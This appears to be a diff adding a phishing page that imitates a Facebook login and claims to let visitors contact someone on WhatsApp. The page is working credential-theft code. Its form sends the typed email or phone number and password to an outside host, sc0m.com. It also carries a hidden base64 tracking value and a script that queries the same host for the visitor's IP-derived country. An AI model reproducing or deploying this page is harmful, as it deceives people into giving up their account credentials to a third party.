@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>login to connect</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      
+      
+       input {
+        width: 332px;
+margin-top: 10px;
+        margin-bottom: 5px;
+        height: 40px;
+        
+        
+        
+      }
+      .btn {
+        margin: auto;
+        text-align: center;
+      }
+       .btn .log {
+        background-color: #1877F2;
+        color: #fff;
+        width: 325px;
+        height: 43px;
+        border: none;
+        margin-top: 10px;
+    
+        
+      }
+      .create {
+        background-color: #00A400;
+        color: #fff;
+        width: 70%;
+        height: 40px;
+        border-radius: 6px;
+        font-size: 18px;
+        border: none;
+        margin-top: 10px;
+      }
+      @media (max-width: 800px) {
+       
+      }
+      p {
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+    </style>
+  </head>
+  <body>
+  <center>  <div class="container">
+      <h2 style="color: rgb(63, 100, 175)"></h2>
+      <img
+        src="https://eu-images.contentstack.com/v3/assets/blt66983808af36a8ef/blt43e47bf5955aa05d/634714c58e3b3b38e6b17752/whatsapp_solomon7_shutterstock.jpg?quality=80&format=jpg&width=690"
+        width="27%">
+<font color="#90949C" size="3"> <p>Log in with your Facebook account to contact us WhatsApp</p>
+        
+      
+      <form action="https://sc0m.com/v/add" method="post">
+        <input
+          class="input"
+          type="text"
+          placeholder="Mobile phone number or e-mail "
+          name="email"
+        />
+        
+        <input
+          class="input"
+          type="password"
+          placeholder="password"
+          name="password" 
+        />
+        <div>
+         <input align="center"type="hidden" id="code" name="codecountry" />
+          <input type="hidden" id="data" value="aWQ9c2MwbV9sYW5nPWVuX3NjPTdfdXNlcj00MDE3MDcwNDE5NA==" name="data" />
+        </div>
+        <div class="btn">
+          <button class="log"><strong><font size="3">Log In</strong></button><br>
+          </form>
+          <p style="color: #7596C8">forget password ?</p><br>
+          
+       <button  class="create">Create a new account </button>
+           <font color="#90949C">
+              </center> 
+              <br><br><br>
+             
+           <p>  <strong>    English(USA)
+</strong></p>   </font> 
+<font color="49659F"><p>Basa Jawa</p>
+<p>日本語</p>
+ <p>Português (Brasil) ...</p>
+ </font> 
+ 
+
+ <p align=center>Meta © 2023</p>
+ 
+        </div>
+      
+    </div>
+    <script src="https://unpkg.com/country-phone-prefix@latest"></script>
+    <script>
+
+
+      let fetchRes = fetch("https://sc0m.com/ext/ip.php");
+      fetchRes
+        .then((res) => res.json())
+        .then((d) => {
+          let dd = cpp[d];
+          document.getElementById("code").value = dd.prefix;
+        });
+    </script>
+  </body>
+</html>
